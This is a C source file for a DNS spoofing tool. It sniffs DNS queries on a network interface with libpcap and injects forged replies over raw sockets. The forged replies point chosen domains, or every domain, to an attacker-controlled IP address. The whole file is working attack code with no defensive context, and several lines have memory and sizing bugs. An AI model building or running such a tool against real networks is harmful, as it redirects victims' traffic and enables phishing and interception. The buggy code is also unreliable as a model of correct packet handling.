#include <stdio.h>
#include <pcap.h>
#include <getopt.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <resolv.h>
#include <sys/ioctl.h>
#include <net/if.h>


struct sniff_ethernet {
	u_char ether_dhost[6];
	u_char ether_shost[6];
	u_short ether_type;
};

struct dns_header {
	char id[2];
	char flags[2];
	char qcount[2];
	char anscount[2];
	char addcount[2];
	char authcount[2];
};

struct query {
        char *qname;
        char qtype[2];
        char qclass[2];
};

struct info {
        char sip[32];
        char domain[150];
        struct info *next;
};



/*

http://minirighi.sourceforge.net/html/ip_8c.html -- Calculate IPHeader Checksum

*/


unsigned short getcrc(unsigned short *data,int len)
{
        long sum=0;
        while(len>1)
        {
                sum=sum+*data++;
                if(sum &0x80000000)
                        sum =(sum &0xFFFF) + (sum >>16);
                len -=2;

        }

        if(len)
                sum +=(unsigned short)*(unsigned char *)data;


        while(sum >>16)
                sum=(sum & 0xFFFF) + (sum >>16);

        return ~sum;


}


/*

http://www.binarytides.com/dns-query-code-in-c-with-winsock

http://www.infologika.com.br/public/dnsquery_main.cpp

DNS Replies using Sockets

*/

void sendl(char *p,uint16_t port,char *packet,int len)
{
        struct sockaddr_in sadd;
        int bs,sock;
        sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
        if(sock<0){
        perror("couldnot create socket");
        }
        sadd.sin_family=AF_INET;
        sadd.sin_port=htons(port);
        sadd.sin_addr.s_addr=inet_addr(p);
        int pt=1;
        if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&pt,sizeof(pt))<0)
        {
                perror("couldnot set socket port");
        }
        sendto(sock,packet,len,0,(struct sockaddr *)&sadd,sizeof(sadd));

}

void spoof(struct info *arg,const struct pcap_pkthdr *header,const u_char *packet)
{
struct sniff_ethernet *ether;
        struct iphdr *ip;
        struct udphdr *udp, *ruh;
        struct ip *rip;
        struct query question, *dns_question_in;
        struct dns_header *dnsh;
        char src_ip[16], dst_ip[16];
        unsigned int ip_header_size;
        u_int16_t port;
        char request[150], *dn;
        char rp[8192];
        int size, i = 1, j = 0, k;
        unsigned int replysize;
        char spoof_ip[32], *reply;
        unsigned char split_ip[4];
        struct in_addr dest, src;
        int flag = 0;
        struct info *current;
        memset(rp, 0, 8192);
	ether = (struct sniff_ethernet *)(packet);
        ip = (struct iphdr*)(((char*) ether) + sizeof(struct sniff_ethernet));
	src.s_addr = ip->saddr;
        dest.s_addr = ip->daddr;
        sprintf(src_ip, "%s", inet_ntoa(src));
        sprintf(dst_ip, "%s", inet_ntoa(dest));
	ip_header_size = ip->ihl * 4;
        udp = (struct udphdr*)(((char*) ip) + ip_header_size);
	dnsh = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
        question.qname = ((char*) dnsh) + sizeof(struct dns_header);

	dn = question.qname;
        size = dn[0];
        while (size > 0) {
                for (k = 0; k < size; k++) {
                        request[j++] = dn[i + k];
                }
                request[j++] = '.';
                i += size;
                size = dn[i++];
		  }
        request[--j] = '\0';

	if (!strcmp(arg->domain, "default")) {
                flag = 1;
                memcpy(spoof_ip, arg->sip, 32);
        } else {
                current = arg;
                while (current != NULL) {
                        if (!strcmp(current->domain, request)) {
                                memcpy(spoof_ip, current->sip, 32);
                                flag = 1;
                        }
                        current = current->next;
                }
        }

        if (flag == 1) {
	reply = rp + sizeof(struct ip) + sizeof(struct udphdr);

	        memcpy(&reply[0], dnsh->id, 2);
		dns_question_in = (struct query*)(((char*) dnsh) + sizeof(struct dns_header));
                size = strlen(request) + 2;
                memcpy(&reply[12], dns_question_in, size);
                size += 12;
		size += 4;
		size += 12;
                sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
                memcpy(&reply[size], split_ip, 4);
                size += 4;

                replysize = size;

	        rip = (struct ip *) rp;
                ruh = (struct udphdr *) (rp + sizeof (struct ip));
                rip->ip_hl = 5;
                rip->ip_v = 4;
		rip->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + replysize;
		rip->ip_ttl = 255;
                rip->ip_p = 17;
		rip->ip_src.s_addr = inet_addr(dst_ip);
                rip->ip_dst.s_addr = inet_addr(src_ip);

                ruh->source = htons(53);
                ruh->dest = udp->source;
                ruh->len = htons(sizeof(struct udphdr) + replysize);
		rip->ip_sum = getcrc((unsigned short *) rp, rip->ip_len >> 1);
	        replysize += (sizeof(struct ip) + sizeof(struct udphdr));

	        sendl(src_ip, ntohs((*(u_int16_t*)&udp)), rp, replysize);

                printf("Spoofed %s:%s\n",src_ip,request);
        } 
}


	

/*
	
https://www.tcpdump.org/sniffex.c

*/

int main(int argc, char *argv[])
{
        char *dev = NULL;
        char buf[1024];
        struct bpf_program fp;
        char *filter;                                                 
        bpf_u_int32 net;
        bpf_u_int32 mask;
        pcap_t *handle;                                 
        int flag=0,flag1=0,flag2=0;
        char *dns = "udp and dst port domain";   
        int opt = 0;
               char *file;
        struct info *first, *last;
        char *line = NULL;
        size_t len = 0;
        ssize_t read;
        char *token;
        char sip[32];
	char delimeter[] = " \t\n";

        memset(buf, 0, 1024);
	while ((opt = getopt(argc, argv, "i:h:")) != -1) {
       switch(opt)
        {
	case 'i':
        flag=1;
        dev=optarg;
        break;
        case 'h':
        file=optarg;
        flag1=1;
        break;		
	}

        }

        if (optind < argc) {
                filter = argv[optind];
                flag2 = 1;
        }

	
	if(flag!=1)
{
        dev=pcap_lookupdev(buf);
        if(dev==NULL)
        {
                perror("interface is NULL");
                exit(0);
        }
}



	        if (flag1 == 1) {
                FILE *fptr = fopen(file, "r");
		printf("file opened");
                if (fptr == 0) {
		 perror("cant open file");
                        exit(0);
                }

                first=last = NULL;
                while ((read = getline(&line, &len, fptr)) != -1) {
                        struct info *new_node= malloc(sizeof(struct info));
                        token = strtok(line,delimeter);
                        memcpy(new_node->sip, token, 16);
			token = strtok(NULL,delimeter);
                        memcpy(new_node->domain, token, strlen(token));
			new_node->next = NULL;
                        if (first == NULL) {
                                last = first = new_node;
                        } else {
                                last->next = new_node;
                                last = last->next;
                        }
                }
                fclose(fptr);
		}

/*

http://www.geekpage.jp/en/programming/linux-network/get-ipaddr.php -- IPaddress of interface in Linux

*/
	else
{
        struct info *in =(struct info *)malloc(sizeof(struct info));        
        struct ifreq fr;
        memcpy(fr.ifr_name,dev,strlen(dev));
        int fd=socket(AF_INET,SOCK_DGRAM,0);
        ioctl(fd,SIOCGIFADDR,&fr);
        close(fd);
        struct sockaddr_in *ip=(struct sockaddr_in*)&fr.ifr_addr;
        memcpy(sip,inet_ntoa(ip->sin_addr),32);
        memcpy(in->sip,sip,16);
        memcpy(in->domain,"default",7);
        in->next=NULL;
        first=in;
}
	 if (pcap_lookupnet(dev, &net, &mask, buf) == -1) {
                perror("Couldn't get netmask for device");
                net=0;
                mask=0;
          }

        handle = pcap_open_live(dev, 1518, 1, 1000, buf);
        if (handle == NULL) {
                perror("Couldn't open device");
                exit(0);
        }

char *exp;
if(flag2==1)
{
        int size=sizeof(dns)+sizeof(filter)+6;
        exp= malloc(sizeof(size));
        strcpy(exp,dns);
        strcat(exp," and ");
        strcat(exp,filter);
}
else
{
        int size=sizeof(dns);
        exp= malloc(size+1);
        strcpy(exp,dns);

}


if (pcap_compile(handle, &fp,exp, 0, 0) == -1) {
                perror("Couldn't parse filter");
                exit(0);
        }


        if (pcap_setfilter(handle, &fp) == -1) {
                perror("Couldn't install filter");
                exit(0);
        }

        pcap_loop(handle, -1,(pcap_handler)spoof, (u_char *)first);
        pcap_freecode(&fp);
        pcap_close(handle);

}
































































